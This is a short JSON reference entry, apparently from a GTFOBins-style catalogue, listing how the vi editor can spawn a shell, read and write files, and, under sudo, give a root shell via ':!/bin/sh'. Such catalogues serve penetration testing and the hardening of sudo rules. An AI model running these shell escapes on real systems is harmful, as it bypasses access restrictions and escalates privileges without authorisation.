{
  "functions": {
    "shell": [
      {
        
        "code": "vi -c ':!/bin/sh' /dev/null\n"
      },
      {
        
        "code": "vi\n:set shell=/bin/sh\n:shell\n"
      }
    ],
    "file-write": [
      {
        
        "code": "vi file_to_write\niDATA\n^[\nw\n"
      }
    ],
    "file-read": [
      {
        
        "code": "vi file_to_read\n"
      }
    ],
    "sudo": [
      {
        
        "code": "sudo vi -c ':!/bin/sh' /dev/null\n"
      }
    ]
  }
}
